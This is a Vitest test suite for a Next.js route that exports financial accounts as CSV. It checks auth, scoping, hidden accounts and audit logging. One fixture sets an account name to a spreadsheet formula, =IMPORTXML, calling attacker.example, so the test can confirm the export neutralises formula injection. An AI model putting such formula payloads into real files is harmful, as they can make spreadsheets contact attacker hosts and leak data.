import { beforeEach, describe, expect, it, vi } from "vitest";
import { NextRequest, NextResponse } from "next/server";
import { clientStub } from "../fixtures/supabase-query";

const mockRequireUser = vi.fn<(...args: unknown[]) => unknown>();
vi.mock("@/lib/http", () => ({
  requireUser: () => mockRequireUser(),
  errorResponse: (_context: string, error: unknown) => {
    throw error;
  },
}));

const mockWriteAudit = vi.fn();
vi.mock("@/lib/audit", () => ({
  writeAudit: (...args: unknown[]) => mockWriteAudit(...args),
  getClientIp: () => "127.0.0.1",
}));

import { GET } from "@/app/api/export/accounts-csv/route";

const USER_ID = "user-1";

beforeEach(() => {
  vi.clearAllMocks();
});

describe("GET /api/export/accounts-csv", () => {
  it("returns the authentication response", async () => {
    const unauthorized = NextResponse.json(
      { error: "Unauthorized" },
      { status: 401 },
    );
    mockRequireUser.mockResolvedValue(unauthorized);

    await expect(
      GET(new NextRequest("http://localhost/api/export/accounts-csv")),
    ).resolves.toBe(unauthorized);
  });

  it("exports exact columns, neutralizes formulas, and scopes Mine", async () => {
    const userClient = clientStub({
      households: { data: [] },
      accounts: {
        data: [
          {
            id: "account-1",
            user_id: USER_ID,
            name: "=IMPORTXML(\"https://attacker.example\")",
            mask: "1234",
            type: "depository",
            subtype: "checking",
            current_balance: 100,
            iso_currency_code: "USD",
            updated_at: "2026-07-29T09:00:00.000Z",
          },
        ],
      },
      manual_accounts: { data: [] },
    });
    mockRequireUser.mockResolvedValue({
      user: { id: USER_ID },
      supabase: userClient,
    });

    const response = await GET(
      new NextRequest("http://localhost/api/export/accounts-csv"),
    );
    const csv = await response.text();

    expect(response.status).toBe(200);
    expect(response.headers.get("content-type")).toBe(
      "text/csv; charset=utf-8",
    );
    expect(response.headers.get("cache-control")).toBe("no-store");
    expect(csv.split("\r\n")[0]).toBe(
      "group,name,subtype,balance,currency,as_of",
    );
    expect(csv).toContain(
      "cash,\"'=IMPORTXML(\"\"https://attacker.example\"\") (...1234)\",checking,100,USD,2026-07-29",
    );
    expect(userClient.scopedToUser("accounts", USER_ID)).toBe(true);
    expect(userClient.scopedToUser("manual_accounts", USER_ID)).toBe(true);
    expect(mockWriteAudit).toHaveBeenCalledWith({
      userId: USER_ID,
      action: "data_export",
      metadata: { kind: "accounts_csv", rows: 1 },
      ip: "127.0.0.1",
    });
  });

  it("uses RLS-visible rows without a user filter for household scope", async () => {
    const userClient = clientStub({
      households: { data: [{ id: "household-1" }] },
      accounts: { data: [] },
      manual_accounts: { data: [] },
    });
    mockRequireUser.mockResolvedValue({
      user: { id: USER_ID },
      supabase: userClient,
    });

    const response = await GET(
      new NextRequest(
        "http://localhost/api/export/accounts-csv?scope=household-1",
      ),
    );

    expect(response.status).toBe(200);
    expect(userClient.scopedToUser("accounts", USER_ID)).toBe(false);
    expect(userClient.scopedToUser("manual_accounts", USER_ID)).toBe(false);
  });

  it("leaves a null balance cell empty", async () => {
    const userClient = clientStub({
      households: { data: [] },
      accounts: {
        data: [
          {
            id: "account-1",
            user_id: USER_ID,
            name: "Unavailable",
            mask: null,
            type: "depository",
            subtype: "checking",
            current_balance: null,
            iso_currency_code: "USD",
            updated_at: "2026-07-29T09:00:00.000Z",
          },
        ],
      },
      manual_accounts: { data: [] },
    });
    mockRequireUser.mockResolvedValue({
      user: { id: USER_ID },
      supabase: userClient,
    });

    const response = await GET(
      new NextRequest("http://localhost/api/export/accounts-csv"),
    );

    expect(await response.text()).toContain(
      "cash,Unavailable,checking,,USD,2026-07-29",
    );
  });

  it("omits accounts the user hid on the Accounts page", async () => {
    const userClient = clientStub({
      households: { data: [] },
      profiles: {
        data: {
          dashboard_prefs: {
            accountsPage: { hiddenIds: ["account-hidden", "manual-hidden"] },
          },
        },
      },
      accounts: {
        data: [
          {
            id: "account-hidden",
            user_id: USER_ID,
            name: "Hidden Checking",
            mask: null,
            type: "depository",
            subtype: "checking",
            current_balance: 10,
            iso_currency_code: "USD",
            updated_at: "2026-07-29T09:00:00.000Z",
          },
          {
            id: "account-shown",
            user_id: USER_ID,
            name: "Shown Checking",
            mask: null,
            type: "depository",
            subtype: "checking",
            current_balance: 20,
            iso_currency_code: "USD",
            updated_at: "2026-07-29T09:00:00.000Z",
          },
        ],
      },
      manual_accounts: {
        data: [
          {
            id: "manual-hidden",
            user_id: USER_ID,
            name: "Hidden Cash",
            account_type: "cash",
            balance: 30,
            updated_at: "2026-07-29T09:00:00.000Z",
          },
        ],
      },
    });
    mockRequireUser.mockResolvedValue({
      user: { id: USER_ID },
      supabase: userClient,
    });

    const response = await GET(
      new NextRequest("http://localhost/api/export/accounts-csv"),
    );
    const csv = await response.text();

    expect(csv).toContain("Shown Checking");
    expect(csv).not.toContain("Hidden Checking");
    expect(csv).not.toContain("Hidden Cash");
    expect(mockWriteAudit).toHaveBeenCalledWith(
      expect.objectContaining({
        metadata: { kind: "accounts_csv", rows: 1 },
      }),
    );
  });
});
